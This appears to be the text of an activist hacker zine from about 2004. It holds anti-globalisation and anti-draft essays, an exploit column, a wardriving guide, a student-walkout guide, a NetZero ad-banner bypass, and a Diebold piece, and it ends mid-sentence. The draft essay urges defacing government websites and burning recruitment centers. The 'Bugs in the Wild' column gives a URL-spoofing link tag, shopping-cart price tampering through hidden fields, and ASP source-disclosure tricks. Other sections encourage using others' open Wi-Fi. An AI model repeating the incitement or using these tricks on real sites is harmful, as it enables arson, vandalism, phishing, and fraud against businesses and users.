Trade\r\nThe FTAA is part of a plan that started with the implementation\r\nof North American Free Trade Agreement\r\non January 1st, 1994. NAFTA has caused hundreds of\r\nthousands of high-paying jobs in the U.S. to be shifted to\r\nsweatshop areas (often called “maquiladora zones”) in\r\nMexico and other places. Using NAFTA rules, Metalclad\r\n(a US corporation) sued Mexico because a poor community\r\ndidn’t want Metalclad’s toxic waste dumped near\r\nthem. They won and Metalclad got $16 million from the\r\ncase. Canada banned a gasoline additive called MMT\r\nbecause it was highly toxic to humans, and using NAFTA\r\nrules, Ethyl Corporation forced Canada to drop the ban\r\nand pay them money because the law was “unfair”.\r\n\r\nNAFTA has literally run over democracy in communities\r\nall over North Amerika in the interest of profits. One of\r\nthe main components of economic globalization is the\r\nidea that “business has a right to make a profit”. Put\r\nsimply, this means that making a profit is more important\r\nthan life, democracy, or justice. The goals of these\r\nagreements are to make it easy for corporations to strike\r\ndown regulations like clean air and water laws, minimum\r\nwage laws, worker safety laws, and others. The whole\r\nprocess is undemocratic, with secret meetings and “fast\r\ntrack legislation” that prevents congress from ratifying\r\ntrade agreements.\r\n\r\nThe FTAA seeks to extend NAFTA to include all of North,\r\nSouth, and Central Amerika, minus Cuba. If they cannot\r\ndo this through the FTAA, they will do it piece by piece\r\nthrough regional trade agreements like the Central\r\nAmerican Free Trade Agreement. CAFTA is set to be\r\nfinished by this year and has the same vision as NAFTA\r\nand the FTAA. These trade agreements contain different\r\nplans, such as Plan Puebla Panama. PPP’s aim is to\r\ndestroy rainforests, displace indigenous communities,\r\nand build a sweatshop superhighway through Cental\r\nAmerika and Mexico leading into the United States.\r\nHere, the workers will be paid dirt wages to make products\r\nfor US corporations, the products will be shipped\r\nnorth and sold in amerika at inflated prices- once again\r\nmaking insane profits for the rich who control the corporations\r\nat the expense of the working poor.\r\n\r\nViva Resistencia!\r\nNeoliberal globalization agreements have caused global\r\nunrest since they were conceived. When NAFTA was\r\nfirst implemented, indigenous communities led a rebellion\r\nfrom the Lacandon jungle in the state of Chiapas,\r\nMexico.\r\n\r\nIn 2000, neoliberal policies caused Bolivia to sell its\r\nwater system to Becthel Corporation. Thousands of\r\npeople took the streets and forced the government to\r\nend the deal. In Quebec in 2001, thousands of people\r\nfought running street battles with vicious police that\r\ntried stifling dissent. Over 4000 canisters of tear gas\r\nwere dispensed-some of which disrupted the meeting’s\r\nactivities. This is not to mention many other international\r\ndemonstrations and uprisings against other gears in the\r\nmachine of global capitalism- institutions like the World\r\nTrade Organization, the International Monetary Fund\r\nand World Bank, World Economic Forum, Trans-Atlantic\r\nBusiness Dialogue, and Group of 8. The G8 is meeting\r\nthis June in Sea Island, Georgia.\r\n\r\nMore information at:\r\nftaaimc.org / infoshop.org / indymedia.org / midwestunrest.net / \r\nglobalexchange.org/campaigns/ftaa/.\r\n\r\n\r\nFuck the Draft\r\n\r\nPreperations are being made to bring back mandantory\r\nmilitary service within the United States. Proposed legislation\r\nentitled the Universal National Service Act of 2003\r\nwould “provide for the common defense by requiring that\r\nall young persons [age 18--26] in the United States, including\r\nwomen, perform a period of military service or a\r\nperiod of civilian service in furtherance of the national defense\r\nand homeland security, and for other purposes,”.\r\nWomen would not be exempt from being drafted, and\r\ncollege students would be brought in upon completion of\r\ntheir current semester.\r\n\r\nThe bill currently sits in congress while the Selective Service\r\nSystem with an additional $28 million is in preperations\r\nfor the draft. The SSS is expected to present to the\r\nBush administration on March 31, 2005 that the system\r\nis ready to handle the draft. If the legislation passes, the\r\ndraft could start as soon as June 15, 2005 - after the\r\nelections.\r\n\r\nAt the moment most military officials and politicians are\r\ndenying the need for a draft at this point in time. But the\r\noccupation of Iraq is getting worse and worse every day\r\nand there is no indication that we will be pulling troops\r\nout anytime soon. Bush’s perpetual ‘war against terrorism’\r\nmight last decades and decades, and new wars will\r\nrequire new cannon fodder.\r\n\r\nWhile most of the madness of the war on terror was\r\nbrought about by Bush and the Republicans, it is interesting\r\nto note that the draft legislation was proposed\r\nby democrats. Even if we do manage to get\r\nBush out of office we will still be “staying the course” in\r\nIraq and the war on terrorism; considering that the Vietnam\r\nwar was escalated by Lyndon Johnson. Kerry voted\r\nto support the war in Afghanistan, Iraq, and the USA PATRIOT\r\nAct: don’t be surprised if they bring back the draft\r\nunder the Kerry administration.\r\n\r\nRealizing that the trend of unjust attacks on our freedoms\r\nwill continue under either a democratic or republican\r\npresidency, it will become increasingly necessary\r\nto explore creative tactics of resistance outside the realm\r\nof mere electoral politics. The next several years we will\r\nbe witnessing a radical transformation of our society and\r\nthe way we live . We can no longer afford to be apathetic.\r\nIt’s time to stand up and fight back. Extreme times call\r\nfor extreme measures; the fight for freedom and liberation\r\nknows no bounds. Evading the draft, defacing government\r\nwebsites, and burning recruitment centers, all\r\nof which and more are serious tactics that need to be\r\nconsidered if we can ever hope to resist and overcome\r\nthis injustice.\r\n\r\n\r\nBugs in the Wild by Rah\r\n\r\nWell my friends, I have finally decided to start writing\r\nthis column. After much thought, I was at a\r\nloss as to what to write about as far as “Bugs in\r\nthe Wild” go. I mean come on, there are just so\r\nmany that I would never be able to list them all\r\nin one article. So taking into careful consideration\r\na few factors I have compressed the column into\r\nwhat I believe www.HackThisSite.org users will\r\nbenefit from.\r\n\r\nBefore I begin the actual “meat and potatoes” of\r\nthe column, I’d like to take a minute to introduce\r\nmyself to everyone. I go by the screenname RaH\r\non HackThisSite. I have been a user of the site for\r\naround 6 months or more. Hacking has interested\r\nme since I got my first computer 7 years ago.\r\nBLEH! Enough on me, who wants the Bugs?\r\n\r\nThe bugs I have for you in this edition are by no\r\nmeans 0day exploits. Anyone who can use a\r\nsearch engine can find this information out for\r\nhimself or herself. All right. Having gotten that out\r\nof the way, allow me to introduce you to our first\r\n“Bug in the Wild”. This bug has been around for\r\nsometime, it is I think a well known exploit dealing\r\nwith the way some “Shopping carts” at sites\r\nhandle user input. The vulnerability exists in dealing\r\nwith hidden form fields. By downloading the\r\nweb-page, one is able to alter the price of an item,\r\nchange the url then make their purchase for their\r\naltered price and then buy said item. I thought I\r\nwould add this one, because in a way it pertains\r\nto a level on HackThisSite.org. I’ll not tell which.\r\n\r\nWe all know Microsoft is a buggy OS. We all have\r\nhad at one time or another the dread “Blue Screen\r\nof Death” lovingly referred to as the B.S.o.D.\r\nThere exists many vulnerabilities in the OS itself\r\nand also the applications it comes with. I’ll use\r\nInternet Explorer as my next bug in the wild. To\r\nexploit this rather lame trick, one simply creates\r\na web page containing a link to another page.\r\nWhat makes it so special is the fact that once\r\nviewed in IE the address is spoofed to be any site\r\nyou want. For this one I’ll include proof of concept\r\ncode. By using the tag <a href=”www.snap.\r\ncom%01@hackthissite.org>LINK</a> a viewer is\r\ntricked into thinking they are viewing www.snap.\r\ncom. When they see the page though, it looks as\r\nif www.HackThisSite.org has been put up in it’s\r\nplace. This bug works because of URL handling\r\ncompliance. It turns out that because IE is compliant\r\nwith present standards this bug occurs. The\r\n%01 is not seen by IE thus everything after it is\r\nhidden from the browser, yet it still gets directed\r\nthere. Odd stuff.\r\n\r\nThe next few are also MS related allowing for remote\r\ncode execution by an attacker. NOTE: I will\r\nnot post proof of concept code for these. Again\r\nall of these bugs can be found on most security\r\nsites.\r\n\r\nIn Microsoft VB for applications, there exists a\r\nheap-based buffer overflow condition. When exploited\r\nproperly remote code execution is possible.\r\nBy using a document with a long ID parameter,\r\nVBE.DLL and VBE6.DLL are vulnerable.\r\nThis condition exists currently in SDK 5.0 through\r\n6.3. There exists in IIS 4.0, 5.0, and 5.1 a crosssite\r\nscripting vulnerability in the ASP function that\r\nhandles redirection. Which could be used to allow\r\na remote attacker to embed a URL containing\r\nscript in the redirection message.\r\n\r\nFor my last one, I will do one that I like. There\r\nis no particular reason I like it except to say that\r\nanyone can do it without a script. In ASP pages\r\nyou can coerce the server to give up more information\r\nit should by using two extra . after the\r\nasp tag. EX: www.hackthissite.org/rah.asp.. Now\r\nthere is a fix for that, but as quickly as they fixed\r\nit a work around was found. By replacing the initial\r\ndot www.hackthissite.org/rah( . )asp with the\r\n%22 or %20 equivalent you are able to recreate\r\nthe bug. There is also another one for ASP pages\r\nusing ::$DATA EX: www.hackthissite.org/rah.\r\nasp::$DATA can get you some choice info.\r\n\r\nWell that about wraps up my column for this issue.\r\nI hope you enjoyed it, and maybe even learned\r\nfrom it. Remember hacking is a way of life. Should\r\nyou get caught, remember these words: “Drop not\r\nthe soap”!\r\n\r\n\r\nOS Wars: Corporate giants stomping\r\nthe free software movement by RaH\r\n\r\nSTOP! Do not read this any further. You are now violating\r\nsome type of law! This very well could be the battle cry to\r\ncome. You must format your system immediately and then\r\nturn it off.\r\n\r\nIn a landmark decision, The United States Supreme Court\r\nruled in favor of the Unix Operating System provider Santa\r\nCruz Operation or SCO. The SCO group fi led petitions\r\nagainst several major corporations, the latest target being\r\nAuto Zone. SCO claims that Auto Zone violated the Unix\r\nlicensing agreement because it is using a version of Unix\r\ncalled Linux-an open operating system rapidly growing in\r\nthe software industry. In other news SCO dropped its lawsuit\r\nagainst hardware manufacturer, IBM due to the lack of\r\nevidence. The unanimous vote by the Supreme Court ruled\r\nin favor of SCO. This decision means that all content on the\r\nInternet; including content stored on personal computers,\r\nis owned by SCO. You must uninstall everything from your\r\ncomputer and never turn it on again.\r\n\r\nThough the previous paragraph is fi ctitious, the drama it\r\nportrays is very real. SCO did fi le a lawsuit against Auto\r\nZone and many other corporate giants. SCO claim that\r\nthese companies are using a version of Linux containing\r\nproprietary SCO code. SCO petitioned the courts to have\r\nthese software companies searched though the details are\r\nunclear as to what was actually copied from Unix.\r\n\r\nIn the past, SCO has been a major contributor to the Open\r\nSource community, boasting it as “the way of the future”,\r\nyet they are in court battling over code ownership. Just like\r\nthe corporate bully Microsoft, they are battling over money\r\nand profi t. To preserve and patent is their business motto.\r\n\r\nThe written language has been around for centuries. Yet\r\nno one have tried to copyright individual words. If words\r\nare like functions in a program, then could these words or\r\ncode be owned? There are many unique ways of coding\r\nthe same function in a program. Copyright claims ought to\r\nbe enforced in the overall performance of a program, rather\r\nthan the use of functions themselves.\r\n\r\nRoyalties is where this whole lawsuit lies. An interesting fact\r\nis that Microsoft, one of the world’s leading OS manufacturer\r\nand developer, had arranged to have another corporation\r\nfund SCO in its attacks.\r\n\r\n(1) “For months, rumors have swirled around the Web alleging\r\nthat Microsoft helped fi nance a small Utah software\r\ncompany’s suit against IBM and two corporations that use\r\nLinux software. Business Week has learned that Microsoft\r\ndid not put up the money, but did play matchmaker for SCO\r\nGroup and BayStar Capital, a San Francisco hedge fund\r\nwhich made a $50 million investment in SCO last October.”\r\nThis excerpt is taken from Business Week online. Further\r\nin the article Lawrence Goldfarb is quoted, “neither Chairman\r\nWilliam Gates nor CEO Steve Ballmer were among\r\nthe people from Microsoft who approached him.”\r\n\r\n(2)On 3 March 2004 Judge Brooke C. Wells ordered IBM\r\nto produce the disputed code, which SCO claim IMB was\r\nusing falsely. The Judge also ordered the SCO group to\r\nproduce the code they claim IBM had moved from Unix to\r\nLinux. The SCO group was also ordered to identify all code\r\nIBM had allegedly moved. As of today’s date no further\r\ndetails have come forth. No doubt both parties have been\r\nadvised not to comment on the case.\r\n\r\nSo just where does Microsoft fit into all this you ask?\r\n\r\n(3)According to the Open Source community, there was a\r\nmemo leak from the SCO offi ce in Utah to SCO executives\r\nreferring to money provided them by Microsoft. Below is a\r\nlink to the alleged email sent internally by SCO. It appears\r\nthat Microsoft is ganging up with SCO in an effort to squash\r\nLinux and further their own dominance in the software industry.\r\n\r\nMicrosoft has coerced the SCO group into this lawsuit.\r\nSometime ago Microsoft invested money in SCO by buying\r\ntheir software licenses for several million dollars. This action\r\nessentially equipped SCO with fundings in court.\r\n\r\nHas the giant Microsoft been planning this all along? Is this\r\ntheir push to force out the underdog? Something similar to\r\nthis took place with Apple in 1985. And Microsoft have gotten\r\nthe upper hand on that occasion too.\r\n\r\nIt is sad that major corporations own this planet. They own\r\neverything on it, and they even think they own the people!\r\nTo some extent they do. But what could one do about this?\r\nWell, for starters reading this article is the first step toward\r\nawareness.\r\n\r\nKnowledge is power! What a person choose to do with this\r\npower defines which side of the fence he or she stand on.\r\nPractice acquired skills and learn all that is possible. Write\r\nsolid code, should one choose to start a software company,\r\nwrite eloquent code that flows through execution. Make it\r\nas secure as possible, keeping in mind it is a labor of love.\r\n\r\n\r\nExploring the Wireless World\r\non your Mac by ikari\r\n\r\nA few months ago, I was vacationing in Sun Valley with my family.\r\nAfter a long day of living the capitalist dream and spending my hardearned\r\nmoney in the various shops and stores of the Idaho resort\r\ntown, I came home to relax and check my email. I took out my iBook,\r\nplugged it in to the phone line, and opened up AOL (yes, it’s AOL, but\r\ndamn, they have dial-up numbers everywhere. That’s all I use it for. I\r\nswear.) After connecting at 28800bps, I opened up my AOL mailbox\r\nthat hadn’t been used in 3 years and cleared the 1,000+ spam messages\r\nfrom it. I then proceeded to check my email on my main account,\r\nwaiting patiently for each message to trickle down the phone\r\nline. I said to myself, “There’s got to be a faster way to do this.” I remembered\r\nhearing from friends earlier that, when they needed to use\r\nthe internet on the run, they just hopped on to a nearby wireless network\r\nand sought out a DHCP lease, hoping they could get on the web\r\nat the expense of a computer-illiterate consumer who just plugged in\r\na wireless router set to factory defaults to his broadband network. The\r\nlegality of such an act is still rather unclear, but I was (and still am)\r\nyoung, and didn’t really care either way. So, I grabbed my iBook, and\r\nset out into the town to fi nd wireless freedom.\r\n\r\nOnce I manually found a wireless access point, I used that access\r\npoint to download a Mac-based “stumbling” program, called iStumbler.\r\nIt’s not the only one out there, but it suits my needs the best. The\r\nmain ones for Mac are iStumbler, MacStumbler, and KisMAC, but it’s\r\nreally just a matter of personal preference as to which one to use.\r\nOnce you’ve got yourself this software, you can drive (or walk, for that\r\nmatter) around and attempt to fi nd open wireless networks. You can\r\nuse your standard internal antenna, or buy/build an external antenna.\r\nThe most common (so it seems) antenna in the wardriving world is a\r\nwaveguide, more commonly known as a “cantenna”, because of its\r\nquality and price. I built my cantenna with about $20 in parts and a\r\n$3 can of chili, and it runs circles around my iBook’s built-in antenna.\r\nFor example, I mapped out a route around Salt Lake City, and drove it\r\ntwice, once with just my iBook, and once with the cantenna attached.\r\nI got 40 APs with my iBook, versus 700 or so with my cantenna.\r\nThere’re a number of websites out there devoted to wardriving and\r\nwith detailed instructions on building a cantenna, so Google around a\r\nbit so I don’t have to explain it here. All of the Mac, and most of the PC\r\nwardriving programs include some sort of GPS/mapping functionality,\r\nso if you have an NMEA-compatible GPS (most Garmin models) and\r\na serial cable for the GPS, you can keep track of your wardriving on\r\na spiffy-looking map.\r\n\r\nOnce you’ve got yourself a wireless notebook and all the gear you\r\nwant/need, set out upon your local neighborhood and see what you\r\nfi nd. You can choose to be active or passive in your wardriving, active\r\ninvolving connecting to the networks and gaining internet access/\r\nhacking/whatever, and passive involving just looking around, seeing\r\nwhat’s there. Passive wardriving should have no legal implications,\r\nbut the legality of active wardriving, especially depending upon your\r\ndefi nition of “active”, is fairly unclear in most states. It’s your responsibility\r\nto know the laws of your area and you are responsible for what\r\nyou do while wardriving. With that said, grab your stuff, grab an antenna,\r\nand get out the door! Explore the wireless world!\r\n\r\n\r\nhow to organize a...\r\nSTUDENT REVOLUTION!\r\n\r\nStudents from Lombard, Illinois walk out of school on March 20 to protest the war in Iraq. Later joined\r\nup with Chicago anti-war actions to commit acts of civil disobedience and shut down the city.\r\nStudent walkouts are a powerful act of protest. It can be\r\na way to unite with your peers and build a culture of resistance\r\nat your school. It is a way to temporarily turn your\r\nschool upside down and put the students in charge for a\r\nchange. It is also valuable organizing training for when\r\nthe real revolution comes. And if done right, it can have\r\na big enough impact that actual change in the system\r\nis made.\r\n\r\nProbably the fi rst comment you’ll have is “something like\r\nthat will never happen at my school”. At least that’s what\r\nI was saying at the beginning of my senior year of high\r\nschool. I never thought we would be able to get away\r\nwith half the stuff we pulled off. Our school was so boring,\r\nmundane, uninteresting. By the end of the year, we\r\nhad published an underground newspaper distributed in\r\nseveral local high schools, had formed a network of radical\r\nstudent activists, and organized a student walkout of\r\nhundreds of kids in protest of the war in Iraq. The entire\r\nculture of the school has changed, and by then I actually\r\nlooked forward to going to school because there were so\r\nmany interesting things happening every day.\r\n\r\nThere is absolutely no reason why you cannot accomplish\r\nthe same, or better. The ultimate achievement\r\nwould be a student strike, sit-in, or walkout. But before\r\nthe fun stuff comes a lot of movement building. Set your\r\nsights high, but take practical approaches to your goals.\r\n\r\nBefore we go any further, your movement must be _\r\nabout_ something. If it’s just ‘for the hell of it’, you should\r\nstop reading now because you will fail miserably regardless.\r\nSo you need a cause behind your movement? No!\r\nYou need a movement behind your cause! If you do not\r\nhave a clear message, you will be quickly written off as\r\nmindless teenage rebellion. By having a purpose for the\r\naction, you gain legitimacy among faculty and conservative\r\nstudents and reduce the risk of discipline from the\r\nauthorities. So make this meaningful. Remember: this\r\nis a forum for you to express your dissatisfaction with\r\nthe status quo. Believe me, every school has something\r\nunfair about it - dress code, censorship, abusive administrators,\r\npledge of allegiance, etc. If you play your cards\r\nright, something may even get done about it.\r\n\r\nRight. So now that you have selected a few issues to\r\nraise a ruckus about, the fi rst thing you must do before\r\nyou develop grandoise plans for student revolution is to\r\nstart talking to people. Gather their thoughts about these\r\nissues. Try to get them all riled up and wanting to take\r\naction. While many people have their personal differences,\r\nalmost everyone if you talk to them long enough\r\nwill agree on some fundamental principles that things are\r\nincredibly unfair and something should be done about it.\r\n\r\nYou will quickly discover that one of the fi rst things that\r\nyou must overcome is any personal inhibitions you might\r\nhave towards people. Do NOT be shy or self-restrained.\r\nDon’t be afraid to go up to total strangers in a friendly way\r\nand start sharing all these personal experiences. Reach\r\nout to people of different cultural backgrounds. Don’t let\r\nsocial cliques and popularity contests keep the student\r\nbody divided - believe me, everyone can unite around\r\nthe common idea that school is a big waste of time.\r\n\r\nOnce you get a band of students who want to do something\r\nabout it, you should call a general meeting. Make\r\nlittle fl yers and posters and put them up around school\r\nannouncing when, where, and why. Get everyone you\r\ncan together in one room to make some decisions about\r\nwhat can be done about the issue in question. Have everyone\r\ngo around the room and introduce themselves.\r\nMake sure no one feels uncomfortable or left out. I also\r\nrecommend that you read up about how to organize a\r\nmeeting based on the directly democratic concensus\r\nprocess where everyone is equal to share ideas on an\r\nanti-authoritarian basis.\r\n\r\nWhether you want to organize an offi cial student group\r\nor remain unoffi cial is up to you. There are advantages\r\nand disadvantages. While being an offi cial student organization,\r\nthe administration will be forced to consider\r\nyour actions with more legitimacy, and provide you with\r\nschool resources, rooms, announcements on the PA,\r\nputting posters up around school, etc. However, you are\r\nbound by school regulations, which may tie your hands\r\nfrom any fun or rebellious activities. Of course, that does\r\nnot mean that you can work independent of the organizationIt\r\nentirely depends on the context of your school.\r\nGather as much information about school policies regarding\r\nstudent organizations and discuss this choice\r\nwith the other group members.\r\n\r\nNow that you have an activist scene growing at your\r\nschool, it’s time to release some publications. Consider\r\nmaking an underground newsletter to bring your message\r\nto the people. Make the content quick, concise, but\r\nmost importantly, INTERESTING! Boredom is counterrevolutionary.\r\nYour movement needs to be fun, enjoyable\r\nand exciting, or no one will want to participate. And when\r\nyou distribute it to students, raise a ruckus! Stand near\r\nthe doors in the cafeteria handing out your propaganda\r\nwhile shouting stuff! Make a scene! Blow bubbles and fill\r\nthe halls with laughter! Get hundreds of copies to your\r\nfriends so that they can distribute them to their friends\r\nand their friends, etc. Make sure every single student has\r\naccess to it. And promote discussion - bring up the debate\r\nin your classes, at lunch tables, with strangers in the\r\nlunch line, etc. By now, it has entered mass consciousness,\r\nthe seeds have been planted, you have a strong\r\nactivist scene, and the time is ripe for an action.\r\n\r\nWhat you should do depends entirely on the context\r\nyour movement takes place in. Try to coincide your action\r\nwith a particular date of significance(in response to\r\na controversial policy made by the government or your\r\nschool administration, anti-war protest in nearby cities,\r\netc). If possible, look at your local independent media\r\ncenter(indymedia.org) to see if there are other student\r\nactivist groups planning any actions - and try to coordinate\r\nyour actions with theirs. Some things to consider\r\nmight be a student walkout, a sit-in in your school, a\r\nmarch to join up with a larger protest downtown, or in\r\nsome situations, a simple teach-in to just discuss the\r\nissues might be appropriate. However, in order to have\r\nany degree of success, you must find a way to bring all\r\nthe unfocused meaningless rebellion into organized rebellion\r\nwith a purpose.\r\n\r\nWeeks before the event, you should prepare some outreach\r\npropaganda. Tape posters up on the walls, in restrooms,\r\nclassrooms, bulletin boards. Make quarter page\r\nflyers explaining where, when, and why. Make a website,\r\nadvertise it in the official school paper. If you can, try to\r\nget it on the school announcements. Make it exciting -\r\nhype it up! Make it the topic of everyone’s discussion. Tell\r\neveryone you see - even people you don’t know. Do not\r\nbe afraid to talk to people you don’t know - get used to\r\npresenting your movement in a quick two minute discussion,\r\nand _don’t be shy_!\r\n\r\nHandling the local press is an important factor to consider.\r\nA press release should be drafted explaining what,\r\nwho, where, when, and why. It should be short and concise,\r\nyet still keep all the points you want to make intact.\r\nStick to a few key phrases that are repeated everywhere\r\n- signs, buttons, leaflets, etc. Around a week before the\r\nevent, send press releases to all the local newspapers\r\nand television networks. Try to invite reporters to take\r\npictures and interview people. Bring your own people to\r\ntake pictures and document the event. It is easy to get\r\n\r\nThe protest itself is a blank canvas for you to draw on.\r\nHave ideas for activities ready. Don’t be afraid of creating\r\na ruckus - but everything you do must have an obvious\r\npurpose. Keep things light-hearted and energetic. Don’t\r\nsit still for a second - dull moments are killer, and people\r\nwill lose interest. Bring fun things to the protest itself.\r\nMake drums out of buckets. Make flags and signs. Bring\r\npeople to play instruments. Get a dance circle going.\r\nHave lots of random shit to hand out. Consider graffiti\r\nto add some life to your area. Make it lively, entertaining,\r\nand interesting - yet still have a very clear, concise\r\npoint which you are able to back up. When people start\r\nleaving, they should be filled with the spirit of activism,\r\nhaving made contacts with other activists, and looking\r\nforward to or organizing their own future actions. People\r\nshould be energized and empowered after the action, not\r\ndisenchanted and dulled.\r\n\r\nThere is a certain high one can get from organizing a\r\nsuccessful action. If done right, the protest can bse a liberating\r\nexperience for you and your comrades beyond\r\nthe best sex or drugs. If you catch the ecstasy of the moment,\r\nyou know you have been doing something right.\r\n\r\nAfter the action, you should prepare a communique\r\nabout the events, and call upon other members and their\r\nparents to call the school board to leave their comments.\r\nDepending on the success of your action, they may be\r\nforced to issue a statement or change policies if you have\r\nbuilt a solid movement with a serious argument that pressures\r\nthe power that be. And there’s room to grow.\r\n\r\nYou’re probably wondering why this guide appeared in\r\nthis magazine. It’s not about hacking(computers, that is).\r\nHowever, it is about building movements of people to accomplish\r\nsomething in real life - a quality that is lacking\r\nin computers and computer users. In this increasingly\r\noppressive world, people need to work with others and\r\nfight for social justice. All too often hackers consider\r\nthemselves elite and above it all in the compute realm,\r\nbut when presented with injustice in the realm world,\r\nthey simply submit themselves to dominating forces.

Have fun!\r\n\r\n\r\nBypassing Netzero’s Ad Banner by plastek\r\n\r\nIntroduction - netzero.com\r\n\r\nWhen using NetZero, the most annoying thing is that\r\nbanner at the bottom of the screen. Loading those\r\nads lags your connection. This really isn’t that bad\r\nespecially since the service is free; except for the fact\r\nthat you never click on any of those anyway. All the\r\nbanner at the bottom of the screen does is slow you\r\ndown and take up space. So you ask, how do I kill\r\nthe banner? Well of course like anything, there is an\r\nexploit for this. This exploit is manual, which means\r\nyou do it yourself. Sooner or later I’ll write a program\r\nto do it.\r\n\r\nAfter getting some background information from a\r\nfriend (who prefers to remain anonymous), I discovered\r\nthis exploit pretty quickly.\r\n\r\nBackground\r\nEver look in a directory on your hard drive and see\r\nall those .dll files? Ever got the impression that they\r\nwere just taking up space? Well actually DLL’s are\r\nvery important.\r\n\r\nFirst off, DLL stand for Dynamic Link Library. To understand\r\nwhat a DLL is and how one works, consider\r\nthis. You have a computer with Windows 3.1 and\r\nyou want to upgrade to Windows 95. So you go out\r\nand buy Windows 95, install it, and it works without\r\na flaw (keeping in mind this example is hypothetical,\r\nWindows 95 will never run flawlessly). So you take\r\nall software you had on your old computer and start\r\ninstalling it. Now of course you expect the software\r\nyou are installing to look the same in Windows 95 as\r\nthey did in 3.1 After all, how could they change? They\r\nwere made before Windows 95 was anyway. That’s\r\nwhere you go wrong, and that’s where DLL’s come\r\nin. As soon as you start up one of the programs, you\r\nnotice the title bar is different. It’s a Windows 95 title\r\nbar, with an icon next to the name of the program,\r\nand an “x” button to close the program next to the\r\ntraditional maximize and minimize buttons. You wonder\r\nhow this is possible. The answer is in the DLL.\r\nThere is DLL that all programs in Windows 95 access\r\nto get information. Since the DLL in Windows 95 had\r\nthe same name as the one in Windows 3.1, the old\r\nprogram will access it as well.\r\n\r\nDLLs contain information on how to do something.\r\nThis something could be connecting to the Internet,\r\nhow to access your printer, or in this case, how to go\r\nand build a new window, how to design it etc’. The\r\ngood thing about DLLs is that they:\r\na) Can be loaded and unloaded when the program is\r\ndone with the action the DLL was required for, which\r\nsaves up some valuable memory.\r\nb) DLLs can be shared between several programs.\r\nFor example: if you have two or more programs that\r\nhave the option within them to start a PPP session\r\nwith your dial-up Internet provider, they can all just\r\nuse the same DLL, which means saving up some\r\ndisk space (you won’t have to have the same DLL\r\nstored on your hard drive three times). The Unix\r\nequivelants to DLLs are libraries (“libs”).\r\n\r\nPreparation\r\nOpen up Windows Explorer and get to C:\\Program\r\nFiles\\NetZero\\bin. In this directory there is a file called\r\n‘net.dll’. Keep your attention on this file, because in\r\njust a few moments we will move it. Now without\r\nchanging the directory, position the left side of the\r\nscreen that only shows the directories so that you\r\ncan see the directory where you are going to move\r\n‘net.dll’. This is so when you have to move the file,\r\nyou won’t have to go looking around for a place to\r\nput it. This is only done to speed up things, because\r\ntiming in this exploit is an important factor.\r\n\r\n**Note: It isn’t important where you move ‘net.dll’, as\r\nlong as it is not in the NetZero directory and that you\r\nremember where you put it.**\r\n\r\nCarrying Out The Exploit\r\nKeeping Windows Explorer open, start up NetZero.\r\nClick ‘connect’ and wait for your modem to dial and\r\nconnect. As soon as your modem stops screaching\r\n(if you have your modem speaker turned off, turn\r\nit back on using control panel --> modem), quickly\r\nswitch back to Windows Explorer and move the ‘net.\r\ndll’ file to another directory. The connection will complete.\r\nAt this point you would expect your browser\r\nto open and for the banner to pop up. But nothing\r\nhappens. Don’t worry, the connection is fine, and you\r\nwon’t get booted off. You have just fooled the banner\r\nprogram. When you’re done using the Internet,\r\njust close your borwser and a prompt will come up to\r\nclose NetZero. Or just double click on the icon in the\r\ntoolbar at the bottom of the screen with the two computer\r\nscreens. There should be a disconnect button\r\non that. After you’ve signed off, move ‘net.dll’ back to\r\nC:\\Program Files\\NetZero\\bin\r\n\r\nHow This Exploit Works\r\nObviously, the important part of this exploit is the file\r\n‘net.dll’. The NetZero start up program needs to access\r\nthis file, that’s why you have to move it back\r\nwhen you’re done. The banner program needs to\r\naccess this file too. If it can’t find the file, the program\r\njust doesn’t start. Strangley enough, it doesn’t\r\nboot you off or anything. Lately when using this exploit\r\nI have noticed something though. The inactivity\r\ntimeout rate is extremely low, like 5 minutes or\r\nsomething.\r\n\r\nEnjoy it.\r\n\r\n\r\nElections Undermine Democracy by DragonMaw\r\n\r\nInternal development memos\r\nDiebold provides electronic voting systems for 37\r\ndifferent states. These systems have come under\r\nextreme controversy due to serious security\r\nissues which have come to light through internal\r\ndevelopment memos that hackers have leaked\r\nto the public. This raises the question of how\r\ncorporations using privatized coding systems\r\nthreaten the democratic electoral process.\r\n\r\nDiebold Electronic Voting Systems sued several\r\ndistributers of the leaked memos, claiming that\r\n“they violated copyright law”. This was shown to\r\nbe false by several students at major universities,\r\nas the memos did not meet the DMCA requirement\r\nfor copyrighted material. Excerpt:\r\n\r\n“Diebold’s blanket cease-and-desist notices are a\r\nblatant abuse of copyright law,” said [Electronic\r\nFrontier Foundation] Staff Attorney Wendy\r\nSeltzer. “Publication of the Diebold documents\r\nis clear fair use because of their importance to\r\nthe public debate over the accuracy of electronic\r\nvoting machines.”\r\n\r\nThe staff at Why-War.com launched an electronic\r\ncivil disobedience campaign against Diebold,\r\nmirroring copies of the memos to hundreds of\r\nplaces on the internet, including file sharing\r\nservices, usenet, and www mirrors. In response,\r\nDiebold launches more lawsuits for the leaking\r\nof internal memos to the general public. This is\r\nproved in court to be a violation of the freedom of\r\ninformation act as well as the bill of rights(freedom\r\nof speech).\r\n\r\nFinally, due to the success of the electronic civil\r\ndisobedience campaign, press coverage of the\r\nmemos, the denouncement of their legal tactics,\r\nand a federal order, Diebold retracted all ceaseand-\r\ndesist letters and suits, and offered a public\r\napology.\r\n\r\nFreedom of Information\r\nThe Diebold scandal raises all sorts of\r\ncontroversial legal and ethical dilemmas. The\r\naccountability of private corporations who abuse\r\ncopyright and freedom of information law, the\r\nthreat to the democratic process that proprietory\r\ncoding poses, and etc.\r\n\r\nCorporations, in the defense of their relentless\r\nquest of the almighty dollar, have violently\r\ndisregarded the constitution. If the democratic\r\nprocess can be sold to the highest bidder, then\r\nthe public will forever be under the greedy wrath\r\nof profiteering corporations who have no concern\r\nof the fundamental rights to freedom of the press\r\nand democratic elections.\r\n\r\nActivists are angry, demanding that all information\r\nmust be released to public scrutiny; instead of\r\nbeing locked away, hiding important and damning\r\nsecrets which would hurt “profit”. A closed\r\nprivatized voting system undermines the very\r\nconcept of open, public, and democratic elections.\r\nPublic systems should be based on an opensource\r\nmodel, which historically have yielded the\r\nmost secure, stable, and democratic systems.\r\n\r\nPolitical Ties\r\nIt is of little surprise that Diebold has made large\r\nfinancial contributions to the Bush administration.\r\nWould you want a president who received\r\ndirty money from breaking copyright law and\r\nundermining the democratic process?\r\n\r\nA Dose of Optimism\r\nDiebold has been proven wrong, criminally\r\nnegligant, and threatens to undermine the\r\ndemocratic process of our country. The Diebold\r\nscandal has opened many people’s eyes to the\r\ndisregard corporations have for public interest.\r\n\r\nThis campaign would not have been successful\r\nwithout the diligent effort of hackers and 